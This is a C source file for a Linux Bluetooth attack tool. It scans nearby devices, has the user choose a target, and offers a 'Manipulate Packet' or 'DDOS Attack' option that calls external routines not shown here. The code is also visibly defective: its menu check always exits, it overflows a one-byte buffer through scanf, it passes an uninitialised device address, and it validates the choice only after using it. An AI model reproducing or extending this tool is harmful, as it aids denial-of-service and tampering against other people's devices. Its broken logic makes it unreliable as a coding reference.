#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/rfcomm.h>
#include "threads.h"
#ifdef USING_CXX
void cpp_modify_packets(const bdaddr_t* target_addr);
void cpp_ddos_attack(const bdaddr_t* target_addr);
#endif

void scan_devices(bdaddr_t *target_addr) {
    inquiry_info *devices = NULL;
    int max_rsp = 255;  
    int num_rsp, i;
    char addr[19] = {0};
    char name[248] = {0};
    int dev_id = hci_get_route(NULL);
    int sock = hci_open_dev(dev_id);
    if (dev_id < 0 || sock < 0) {
        perror("Failed to open Bluetooth socket");
        exit(1);
    }
    devices = (inquiry_info *)malloc(max_rsp * sizeof(inquiry_info));
    if (!devices) {
        perror("Failed to allocate memory");
        close(sock);
        exit(1);
    }
    num_rsp = hci_inquiry(dev_id, 8, max_rsp, NULL, &devices, IREQ_CACHE_FLUSH);
    if (num_rsp < 0) {
        perror("Failed to perform Bluetooth scan");
        free(devices);
        close(sock);
        exit(1);
    }
    printf("Found %d devices:\n", num_rsp);
    for (i = 0; i < num_rsp; i++) {
        ba2str(&(devices + i)->bdaddr, addr);
        memset(name, 0, sizeof(name));
        if (hci_read_remote_name(sock, &(devices + i)->bdaddr, sizeof(name), name, 0) < 0) {
            strcpy(name, "[unknown]");
        }
        printf("%d: %s %s\n", i + 1, addr, name);
    }
    int choice;
    printf("Enter the number of the device to send packets to: ");
    scanf("%d", &choice);
    sleep(1);
    int attack;
    printf("Select Attack");
    printf("  1.Manipulate Packet");
    printf("  2.DDOS Attack");
    printf("Select a Number Between 1 and 2");
    scanf("%d" , &attack);
    if (attack != 1 || attack != 2){
		exit(1);
	}else if (attack == 1){
		char msg;
		printf("Write a Message For the Packet: ");
		scanf("%s" , &msg);
		bdaddr_t device;
		run_threads(&device , msg);
	}else{
		cpp_ddos_attack(&(devices + choice - 1)->bdaddr);
	}
    if (choice < 1 || choice > num_rsp) {
        printf("Invalid choice.\n");
        free(devices);
        close(sock);
        exit(1);
    }
    bacpy(target_addr, &(devices + choice - 1)->bdaddr);
    free(devices);
    close(sock);
}
